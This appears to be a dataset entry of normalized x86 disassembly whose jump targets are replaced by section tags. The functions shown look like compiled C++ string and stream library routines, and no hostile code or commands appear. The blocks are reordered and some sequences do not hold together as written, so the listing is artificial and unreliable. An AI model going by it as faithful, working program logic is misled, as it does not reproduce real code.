mov esi ecx
call sub_1000718d
mov eax [ ebp + 0x8 ]
mov [ esi + 0x28 ] eax
lea eax [ ebp + 0x8 ]
xor ebx ebx
push eax
mov ecx esi
mov [ esi + 0x2c ] ebx
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000cfaa
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp + 0x8 ]
mov edi eax
call sub_10007dbd
mov eax [ edi ]
push 0x20
mov ecx edi
call [ eax + 0x18 ]
mov [ esi + 0x30 ] al
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x4 ] ebx
call sub_1002b37e
retn 0x4
mov eax [ esi + 0x8 ]
or eax 0x4
push ebx
push esi
mov ecx eax
call sub_100080a5
sub_1000c55f
lea edx [ eax + 0x18 ]
mov [ eax + 0x20 ] edx
lea edx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
lea edx [ eax + 0x28 ]
mov [ eax + 0x30 ] edx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
lea edx [ eax + 0x2c ]
mov [ eax + 0x34 ] edx
xor edx edx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] ecx
mov [ ecx ] edx
mov ecx [ eax + 0x24 ]
mov [ ecx ] edx
mov ecx [ eax + 0x34 ]
mov [ ecx ] edx
mov ecx [ eax + 0x10 ]
mov [ ecx ] edx
mov ecx [ eax + 0x20 ]
mov [ ecx ] edx
mov eax [ eax + 0x30 ]
mov [ eax ] edx
retn
sub_1000c5a1
push 0x4
mov eax sub_10051cd1
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_10001bdf
and [ ebp - 0x4 ] 0x0
call sub_100259a0
push [ eax ]
push esi
push [ ebp + 0x8 ]
call sub_1000c656
add esp 0xc
mov eax esi
call sub_1002b37e
retn 0x8
sub_1000c5d8
push 0x0
mov eax sub_1004fedd
call sub_1002b2a6
mov ecx [ ebp + 0x8 ]
call sub_10001bdf
and [ ebp - 0x4 ] 0x0
call sub_100259a0
push [ eax ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_100236a0
mov eax [ ebp + 0x8 ]
add esp 0xc
call sub_1002b37e
retn 0x8
sub_1000c610
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_1000c731
add esp 0xc
pop edi
leave
retn 0x8
sub_1000c634
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1002762d
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
push [ esi + 0x14 ]
push 0x0
call sub_10006e80
pop esi
retn 0x4
sub_1000c656
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
call sub_10009d44
mov ecx eax
call sub_10006f37
lea esi [ eax + esi * 2 ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx edi
call sub_10009d44
mov ecx eax
call sub_10006f37
mov ecx [ ebp + 0xc ]
push esi
push eax
call sub_1000ccdc
sub_1000c69d
push 0x4
mov eax sub_1004f96e
call sub_1002b2d9
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_1000c6fa
push esi
mov esi eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
ja r-xdata
test esi esi
je r-xdata
pop esi
retn
dec [ esp + 0x8 ]
add esi 0x8
mov eax [ edi ]
mov [ esi ] eax
lea eax [ edi + 0x4 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_1000af36
sub_1000c731
push esi
push edi
mov edi eax
mov esi ecx
jmp r-xdata
cmp esi [ esp + 0xc ]
jne r-xdata
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
add edi 0x8
add esi 0x8
mov eax [ esi ]
mov [ edi ] eax
lea eax [ esi + 0x4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_1000af36
sub_1000c75e
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] esi
jb r-xdata
call sub_10021cfc
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax esi
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
cmp eax ebx
jae r-xdata
mov [ ebp + 0xc ] eax
sub ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax ebx
cmp eax ecx
ja r-xdata
mov ebx eax
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax [ ebp + 0xc ]
mov edx ecx
sub edx esi
sub edx [ ebp + 0xc ]
add eax ebx
mov [ ebp + 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp ecx eax
jae r-xdata
call sub_10021cc4
cmp edi [ ebp + 0x10 ]
je r-xdata
push 0x0
push eax
mov ecx edi
call sub_100024cd
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ebx eax
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
add eax esi
cmp eax [ ebp + 0x14 ]
mov [ ebp + 0x18 ] eax
mov eax [ edi + 0x18 ]
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] ecx
cmp eax 0x8
jb r-xdata
cmp eax 0x8
jb r-xdata
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
mov [ ebp + 0x18 ] ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
add ecx esi
sub eax esi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x18 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1000229a
mov eax [ ebp + 0x10 ]
add esp 0x10
cmp [ eax + 0x18 ] 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] edx
mov edx [ ebp + 0x14 ]
push ebx
lea ecx [ ecx + edx * 2 ]
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
push eax
call sub_1000229a
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x10 ]
add ecx esi
sub eax esi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x8 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1000229a
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
add esp 0x10
push [ ebp - 0x4 ]
mov ecx edi
call sub_10002630
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
mov ebx [ ebp + 0x14 ]
lea edx [ edx + ebx * 2 ]
push edx
sub eax esi
push eax
lea eax [ ecx + esi * 2 ]
push eax
call sub_10002614
jmp r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x14 ]
lea ecx [ edx + ecx * 2 ]
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
push eax
call sub_1000229a
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0x8 ]
mov [ ebp + 0x10 ] edx
mov edx [ ebp + 0x18 ]
sub eax esi
lea ecx [ ecx + edx * 2 ]
push ecx
mov ecx [ ebp + 0x10 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1000229a
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
push eax
call sub_1000229a
push [ ebp + 0x8 ]
mov [ ebp + 0x14 ] edx
mov edx [ ebp + 0xc ]
add edx esi
sub eax esi
sub eax ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
mov eax [ ebp + 0x14 ]
add esi ebx
lea eax [ eax + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
push ebx
mov ebx [ ebp + 0x14 ]
lea edx [ edx + ebx * 2 ]
sub eax esi
push edx
push eax
lea eax [ ecx + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0x8 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
add ecx esi
add ecx ecx
mov [ ebp + 0x18 ] ecx
sub eax esi
add ecx edx
push ecx
mov ecx [ ebp + 0x10 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1000229a
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx [ ebp + 0xc ]
push ebx
add ecx ebx
mov ebx [ ebp + 0x10 ]
lea ecx [ ebx + ecx * 2 ]
sub eax esi
push ecx
push eax
lea eax [ edx + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
mov edx ebx
sub edx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x14 ]
add edx ebx
mov ebx [ ebp + 0x10 ]
lea edx [ ebx + edx * 2 ]
push edx
push eax
mov eax [ ebp + 0x18 ]
add eax ecx
sub_1000cabd
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
mov esi ecx
call sub_10001d48
test al al
je r-xdata
mov edi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] edi
jae r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
mov ecx eax
sub ecx edi
cmp ecx [ ebp + 0xc ]
jae r-xdata
call sub_10021cfc
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
sub eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
or ecx 0xffffffff
sub ecx ebx
cmp ecx eax
ja r-xdata
mov [ ebp + 0xc ] ecx
pop edi
pop esi
leave
retn 0x10
push [ ebp + 0x14 ]
sub edi eax
sar edi 0x1
push edi
push esi
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_1000c75e
jmp r-xdata
mov ecx [ esi + 0x14 ]
sub ecx edi
sub ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
cmp ebx [ ebp + 0xc ]
jae r-xdata
call sub_10021cc4
test ebx ebx
ja r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
push 0x0
add eax ebx
push eax
mov ecx esi
mov [ ebp + 0x14 ] eax
call sub_100024cd
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax esi
pop ebx
cmp [ ebp + 0xc ] ebx
jae r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] edx
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
push ecx
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x14 ] edx
mov edx [ ebp + 0x8 ]
add ecx edi
sub eax edi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x14 ]
sub eax ebx
push eax
lea eax [ edi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1000229a
add esp 0x10
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
sub eax edi
push eax
lea eax [ ecx + edi * 2 ]
push eax
call sub_10002614
add esp 0x10
push [ ebp + 0x14 ]
mov ecx esi
call sub_10002630
push [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx edi
sub eax edi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x8 ]
sub eax ebx
push eax
lea eax [ edi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1000229a
add esp 0x10
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_1000cc3a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x1c ]
push edi
lea eax [ esp + 0x10 ]
mov ebx ecx
push eax
mov [ esp + 0x10 ] ebx
call sub_10009d44
cmp [ ebp + 0x18 ] esi
jne r-xdata
sub esi [ ebp + 0x18 ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
sar esi 0x1
push esi
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000cc23
add esp 0x10
push eax
push ebx
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000cc23
mov ecx [ esp + 0x28 ]
add esp 0x10
push eax
call sub_1000cabd
push [ ebp + 0xc ]
mov esi [ eax ]
push [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000cc23
add esp 0x10
push eax
push edi
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000cc23
add esp 0x10
push eax
mov ecx ebx
call sub_100022bb
jmp r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_1000ccdc
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
mov esi ecx
call sub_10007e38
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_10007e38
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
push ebx
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_1000cc3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000cd22
push ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax esi
pop ecx
retn
mov eax [ eax + 0x28 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x0
push 0x4
add edx esi
call sub_100081bf
sub_1000cda2
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002236e
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_1000cde1
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10022e02
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_1000ce43
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_100272f3
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x10
call sub_10027827
sub_1000ce71
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x28 ]
pop ebp
retn 0x10
sub_1000ce97
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_100272f3
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x14
call sub_10027827
sub_1000cec5
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
lea eax [ ebp - 0x10 ]
mov edi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007853
add edi 0x8
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_1000cf09
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x18
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1000ceea
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1000cfaa
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000cf09
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1000d047
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x14 ]
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_1000d074
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x10 ]
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_1000d094
push 0x4
mov eax sub_10051cae
call sub_1002b2a6
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
push 0x0
push eax
call sub_100080a5
xor al al
or ecx 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi eax
call sub_1000cd22
mov al 0x1
jmp r-xdata
call sub_1002b37e
retn
sub_1000d124
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_1000d149
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_1000218b
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_1000d1c4
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_1000218b
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_1000d27a
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_10021d53
mov ecx edi
call sub_10007dbd
push edi
call sub_100272e8
pop ecx
sub_1000d2a3
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_10021dee
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000d2e8
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10021dee
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000d337
push 0xc
mov eax sub_10050409
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_10023070
pop ecx
pop ecx
push 0x0
push 0x1
mov ecx esi
call sub_1000264e
call sub_1002b37e
retn
sub_1000d385
push 0x4
mov eax sub_10051c93
call sub_1002b2d9
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_1000d3df
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] edi
call sub_1000d385
push edi
push edi
push esi
call sub_1000d3de
add esp 0xc
pop edi
mov eax esi
pop esi
retn 0x4
sub_1000d425
push 0x4
mov eax sub_100524b3
call sub_1002b2a6
mov ebx ecx
mov [ ebp - 0x10 ] ebx
push 0x28
call sub_1002738b
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_1000d404
and [ esi + 0x24 ] 0x0
jmp r-xdata
push esi
mov ecx ebx
call sub_1000d3df
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_10024490
add esp 0xc
mov eax ebx
call sub_1002b37e
retn 0x4
sub_1000d4e7
push 0x4
mov eax sub_1004feba
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_1000264e
call sub_1002b37e
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000d521
push ebp
mov ebp esp
